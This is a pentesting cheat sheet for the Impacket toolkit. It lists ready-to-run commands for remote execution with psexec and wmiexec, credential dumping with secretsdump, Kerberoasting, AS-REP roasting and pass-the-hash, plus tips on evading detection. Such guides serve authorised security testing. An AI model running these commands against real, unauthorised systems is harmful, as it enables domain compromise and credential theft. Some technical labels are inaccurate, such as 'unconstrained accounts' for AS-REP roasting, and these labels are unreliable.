---
icon: box-open-full
---

# Impacket

## The Impacket Masterclass: Professional Network Protocol Toolkit for Penetration Testing

Impacket is a powerful Python library and toolkit that provides low-level programmatic access to numerous network protocols, enabling advanced penetration testing, exploitation, and network automation. It is widely used by red teamers and security researchers to interact with Windows network services, craft custom protocol packets, and perform lateral movement and credential extraction.

***

### I. Environment Setup: Dynamic Variables

Set environment variables for repeatable, flexible usage:

```bash
export TARGET_IP="10.10.10.10"
export USERNAME="administrator"
export PASSWORD="Password123!"
export DOMAIN="TARGETDOMAIN"
export HASH=""
export WORK_DIR="impacket-results"
export SMB_PORT=445
export SCRIPT="psexec"          # Popular Impacket scripts: psexec, wmiexec, smbexec, secretsdump, GetUserSPNs, GetNPUsers, etc.
export OPTIONS="--hashes $HASH" # e.g., NTLM hash authentication

```

***

### II. Core Capabilities & Workflow

* **Remote Command Execution:** Execute commands on Windows targets over SMB/RPC with `psexec.py`, `wmiexec.py`, or `smbexec.py`.
* **Credential Dumping:** Extract password hashes, LSA secrets, and cached credentials with `secretsdump.py`.
* **Kerberos Attack Tools:** Request and abuse service tickets, crack service principal names with `GetUserSPNs.py` and `GetNPUsers.py`.
* **Interactive SMB Sessions:** Shell-like access via SMB shares for lateral movement.
* **Protocol Access:** Build and parse packets for SMB, MSRPC, DCOM, LDAP, TDS (MSSQL), Kerberos, and more.
* **Python Library:** Build custom tools or automate tasks using Impacket’s extensive class and protocol handling.
* **Post-Exploitation:** Integrate findings with Metasploit, CrackMapExec, or other frameworks for follow-up attacks and persistence.

***

### III. Professional Usage Examples

#### 1. Remote Command Execution with PsExec

```bash
python3 psexec.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -nooutput

```

#### 2. Execute WMI Commands (without writing files)

```bash
python3 wmiexec.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP "whoami"

```

#### 3. Dump Credentials from Target

```bash
python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -outputfile $WORK_DIR/dump

```

#### 4. Kerberos Service Principal Name Enumeration (SPN)

```bash
python3 GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -outputfile $WORK_DIR/spns.txt

```

#### 5. AS-REP Roasting Attack for Unconstrained Accounts

```bash
python3 GetNPUsers.py $DOMAIN/$USERNAME -outputfile $WORK_DIR/asrep.roast

```

#### 6. SMB File Upload & Execution

Use low-level Impacket classes or `psexec.py` to upload and execute payloads remotely.

#### 7. Using Hashes for Authentication

```bash
python3 psexec.py $DOMAIN/$USERNAME@$TARGET_IP -hashes $HASH

```

#### 8. Interactive SMB Client

```bash
python3 smbclient.py //$TARGET_IP/share -username $USERNAME -password $PASSWORD

```

***

### IV. Advanced Techniques & Scenarios

* **Custom Protocol Packet Crafting:** Develop specific protocol manipulations and explore undocumented features.
* **Lateral Movement Automation:** Build scripts chaining Impacket commands to traverse networks.
* **Detection Evasion:** Use Impacket's ability to perform fileless commands (`wmiexec.py`) for stealthier operations.
* **Integration with Post-Exploitation Frameworks:** Utilize Impacket dumps in CrackMapExec or Metasploit for persistence and privilege escalation.
* **Hash Attacks:** Use NTLM hashes for pass-the-hash style authentication without needing passwords.
* **Kerberos Ticket Abuse:** Request overprivileged tickets or tickets for services to access critical systems.
* **Red Team Collaboration:** Embed Impacket-based scripts in C2 infrastructure for custom payload delivery.

***

### V. Real-World Workflow Example

1. **Set environment variables:**

```bash
export TARGET_IP="192.168.1.105"
export DOMAIN="CORP"
export USERNAME="admin"
export PASSWORD="Passw0rd!"
export WORK_DIR="impacket_output"

```

1. **Dump credentials from a target:**

```bash
python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -outputfile $WORK_DIR/secrets

```

1. **Run remote commands with WMI:**

```bash
python3 wmiexec.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP "ipconfig /all"

```

1. **Dump Kerberos tickets for privilege escalation:**

```bash
python3 GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP -outputfile $WORK_DIR/spns

```

1. **Attempt Pass-the-Hash authentication:**

```bash
python3 psexec.py $DOMAIN/$USERNAME@$TARGET_IP -hashes $HASH

```

***

### VI. Pro Tips & Best Practices

* **Always prefer fileless command execution** (`wmiexec.py`) to reduce footprints.
* **Combine credential dumping with Kerberos ticket attacks** for robust domain escalation.
* **Use NTLM hashes carefully** to operate without cleartext passwords.
* **Integrate with other pentesting tools** such as CrackMapExec and Metasploit for comprehensive exploitation.
* **Audit target environment** thoroughly to select the right protocols for each engagement.
* **Maintain operational security:** avoid overuse of noisy operations like file uploads unless needed.
* **Regularly update Impacket** to benefit from latest features and bug fixes.
* **Exfiltrate credentials securely** and document all moves for reporting.

***

This professional Impacket guide empowers pentesters to harness deep Windows protocol interactions for remote command execution, credential harvesting, lateral movement, and sophisticated domain attacks.

Sources
